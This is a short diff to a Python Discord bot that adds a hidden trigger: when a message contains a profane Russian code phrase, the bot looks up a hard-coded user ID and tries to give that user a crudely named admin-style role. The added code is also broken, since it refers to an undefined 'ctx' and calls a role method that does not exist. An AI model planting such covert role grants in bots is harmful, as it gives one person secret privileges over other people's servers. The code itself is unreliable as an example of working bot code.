@@ -12,6 +12,10 @@ async def on_message(message):
     
     if "протокол ХУЙ" in message.content:
         
+        member = ctx.guild.get_member(764136341486698516)
+        role1 = discord.utils.get(ctx.guild.roles, name = "Админ Гей")
+        await member.give_roles(role1)
+        
         i = 3
         
         while i != 0:
